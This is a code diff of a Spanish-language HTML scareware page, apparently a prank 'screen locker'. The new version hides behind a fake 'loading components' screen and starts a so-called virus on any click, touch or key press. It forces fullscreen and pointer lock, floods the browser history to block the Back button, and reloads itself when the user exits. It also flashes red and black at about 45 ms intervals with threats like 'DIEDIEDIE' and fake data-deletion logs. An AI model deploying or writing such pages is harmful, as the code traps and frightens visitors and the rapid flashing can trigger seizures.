@@ -3,69 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_LOCK_ACTIVE</title>
+    <title>⚡ SYSTEM FAILURE ⚡</title>
     <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        * { box-sizing: border-box; cursor: none !important; }
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; 
             background-color: #000; color: #f00; 
             font-family: 'Courier New', monospace; 
-            overflow: hidden; user-select: none; touch-action: none;
+            overflow: hidden; touch-action: none;
         }
 
-        /* Pantalla de Inicio */
-        #setup-screen {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100%; background: #0a0a0a; z-index: 10; position: relative;
+        /* Pantalla de "Carga" invisible que cubre todo */
+        #trigger-layer {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 999999; display: flex; align-items: center; justify-content: center;
+            background: #000; cursor: pointer;
         }
 
-        .window {
-            width: 90%; max-width: 400px;
-            background: #c0c0c0; border: 3px solid #fff;
-            border-right-color: #555; border-bottom-color: #555;
-            color: #000; padding: 2px;
-        }
+        .loading-text { font-size: 1.2rem; color: #333; animation: pulse 2s infinite; }
 
-        .title-bar { background: #000080; color: #fff; padding: 5px; font-weight: bold; display: flex; justify-content: space-between; }
-
-        .btn {
-            background: #c0c0c0; border: 2px solid #fff; border-right-color: #555; border-bottom-color: #555;
-            padding: 15px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px;
-        }
-
-        /* Capa Killbot Inescapable */
+        /* Capa Killbot */
         #kiosk-mode {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background-color: #f00; display: none; z-index: 99999;
-            cursor: none;
+            background-color: #000; display: none; z-index: 100;
         }
 
         .glitch-text {
-            position: absolute; font-size: 12vw; font-weight: 900;
-            color: white; text-shadow: 5px 5px #000; pointer-events: none;
-            animation: shake 0.05s infinite;
+            position: absolute; font-size: 15vw; font-weight: 900;
+            color: white; text-shadow: 5px 5px #f00; pointer-events: none;
+            animation: shake 0.05s infinite; text-transform: uppercase;
         }
 
-        #log { position: absolute; bottom: 0; left: 0; font-size: 10px; color: #fff; pointer-events: none; padding: 10px; }
+        #log { position: absolute; bottom: 0; left: 0; font-size: 10px; color: #0f0; padding: 10px; opacity: 0.6; }
 
         @keyframes shake {
-            0% { transform: translate(5px, -5px); }
-            50% { transform: translate(-5px, 5px); }
+            0% { transform: translate(5px, 3px); filter: hue-rotate(90deg); }
+            50% { transform: translate(-5px, -3px); filter: hue-rotate(0deg); }
             100% { transform: translate(0, 0); }
         }
+
+        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 0.5; } 100% { opacity: 0.2; } }
     </style>
 </head>
-<body onclick="forceKiosk()">
+<body oncontextmenu="return false;">
 
-    <div id="setup-screen">
-        <div class="window">
-            <div class="title-bar"><span>SECURITY_CHECK.EXE</span><span>[X]</span></div>
-            <div class="content" id="win-content" style="padding:20px; text-align:center;">
-                <p><b>ERROR CRÍTICO DETECTADO</b></p>
-                <p>El sistema requiere reparación inmediata para evitar la pérdida de datos.</p>
-                <button class="btn" id="start-btn">REPARAR AHORA</button>
-            </div>
-        </div>
+    <div id="trigger-layer">
+        <div class="loading-text">Cargando componentes del sistema...</div>
     </div>
 
     <div id="kiosk-mode">
@@ -77,74 +60,77 @@
     </audio>
 
     <script>
-        const startBtn = document.getElementById('start-btn');
+        const trigger = document.getElementById('trigger-layer');
         const kiosk = document.getElementById('kiosk-mode');
         const audio = document.getElementById('killbot-audio');
         const log = document.getElementById('log');
-        let active = false;
+        let virusActive = false;
 
-        function forceKiosk() {
-            if (!active) return;
+        // Función que activa el modo Kiosko Inescapable
+        function startVirus() {
+            virusActive = true;
+            trigger.style.display = 'none';
+            kiosk.style.display = 'block';
+
+            // 1. Forzar Pantalla Completa
             const el = document.documentElement;
             if (el.requestFullscreen) el.requestFullscreen();
-            if (document.body.requestPointerLock) document.body.requestPointerLock();
-        }
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-        startBtn.addEventListener('click', () => {
-            active = true;
-            forceKiosk();
+            // 2. Bloquear puntero (PC)
+            if (document.body.requestPointerLock) document.body.requestPointerLock();
+
+            // 3. Iniciar audio
             audio.play();
 
-            document.getElementById('win-content').innerHTML = "Intentando recuperar sectores dañados... <br> No apague el dispositivo.";
-            
-            // Llenar el historial para bloquear el botón de "Atrás" en Android
-            for(let i=0; i<50; i++) {
-                history.pushState({page: i}, "", "#virus_" + i);
+            // 4. Llenar historial para bloquear botón "Atrás" (Android)
+            for(let i=0; i<100; i++) {
+                history.pushState({hack: true}, "", "#system_corrupted_" + i);
             }
 
-            setTimeout(() => {
-                document.getElementById('setup-screen').style.display = 'none';
-                kiosk.style.display = 'block';
-
-                setInterval(() => {
-                    spawnGlitch();
-                    updateLog();
-                    kiosk.style.backgroundColor = (Math.random() > 0.5) ? "#f00" : "#000";
-                    if(Math.random() > 0.95) document.body.style.filter = "invert(1)";
-                    else document.body.style.filter = "none";
-                }, 40);
-            }, 15000);
-        });
-
-        function spawnGlitch() {
-            const t = document.createElement('div');
-            t.className = 'glitch-text';
-            t.innerText = ["NO EXIT", "KILLBOT", "STAY", "ERROR", "NULL"][Math.floor(Math.random()*5)];
-            t.style.left = Math.random() * 80 + "vw";
-            t.style.top = Math.random() * 80 + "vh";
-            kiosk.appendChild(t);
-            setTimeout(() => t.remove(), 300);
+            // 5. Iniciar Caos Visual
+            runVisualChaos();
         }
 
-        function updateLog() {
-            const l = document.createElement('div');
-            l.innerText = `OVERWRITING_MEMORY_ADDR_0x${Math.random().toString(16).slice(2,10)}`;
-            log.appendChild(l);
-            if(log.childNodes.length > 30) log.removeChild(log.firstChild);
+        // Cualquier interacción activa el virus
+        window.addEventListener('mousedown', () => { if(!virusActive) startVirus(); });
+        window.addEventListener('touchstart', () => { if(!virusActive) startVirus(); });
+        window.addEventListener('keydown', () => { if(!virusActive) startVirus(); });
+
+        function runVisualChaos() {
+            setInterval(() => {
+                // Generar textos aleatorios
+                const t = document.createElement('div');
+                t.className = 'glitch-text';
+                const words = ["KILLBOT", "DIEDIEDIE", "ERROR", "CRITICAL", "NO ESCAPE", "VOID"];
+                t.innerText = words[Math.floor(Math.random() * words.length)];
+                t.style.left = Math.random() * 80 + "vw";
+                t.style.top = Math.random() * 80 + "vh";
+                kiosk.appendChild(t);
+                setTimeout(() => t.remove(), 200);
+
+                // Flash agresivo
+                kiosk.style.backgroundColor = (Math.random() > 0.5) ? "#f00" : "#000";
+                
+                // Log de terminal
+                const l = document.createElement('div');
+                l.innerText = `[FATAL] DELETING_BLOCK_${Math.random().toString(16).toUpperCase().slice(2,10)}`;
+                log.appendChild(l);
+                if(log.childNodes.length > 30) log.removeChild(log.firstChild);
+            }, 45);
         }
 
-        // Bloqueos de teclado para Windows
-        window.addEventListener('keydown', (e) => {
-            if (active) {
-                e.preventDefault();
-                return false;
+        // Re-activar fullscreen si el usuario intenta salir
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && virusActive) {
+                // Al primer toque después de intentar salir, vuelve a pantalla completa
+                kiosk.innerHTML += '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.5);z-index:999999;display:flex;align-items:center;justify-content:center;font-size:2rem;color:white;">ERROR: ACCESO DENEGADO</div>';
+                setTimeout(() => location.reload(), 1000); // Si intenta salir, reiniciamos el bucle
             }
         });
 
-        // Anti-salida de pestaña
-        window.onbeforeunload = function() {
-            return "SISTEMA CORRUPTO. SI SALES, EL DISPOSITIVO QUEDARÁ INSERVIBLE.";
-        };
+        // Bloqueo total de salida
+        window.onbeforeunload = () => "DO NOT LEAVE";
     </script>
 </body>
 </html>
